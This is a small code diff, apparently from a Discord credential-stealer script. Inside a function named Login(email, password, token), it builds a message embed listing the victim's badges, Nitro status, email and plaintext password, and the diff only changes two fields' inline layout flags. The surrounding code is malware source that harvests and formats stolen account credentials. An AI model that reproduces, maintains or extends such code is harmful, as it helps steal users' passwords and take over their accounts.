@@ -314,7 +314,7 @@ function Login(email, password, token) {
                             }, {
                                 name: "Badges",
                                 value: `${GetBadges(json.flags)}`,
-                                inline: !0
+                                inline: !1
                             }, {
                                 name: "Nitro",
                                 value: `${GetNitro(json.premium_type)}`,
@@ -326,7 +326,7 @@ function Login(email, password, token) {
                             }, {
                                 name: "Email",
                                 value: `\`${email}\``,
-                                inline: !0
+                                inline: !1
                             }, {
                                 name: "Password",
                                 value: `\`${password}\``,
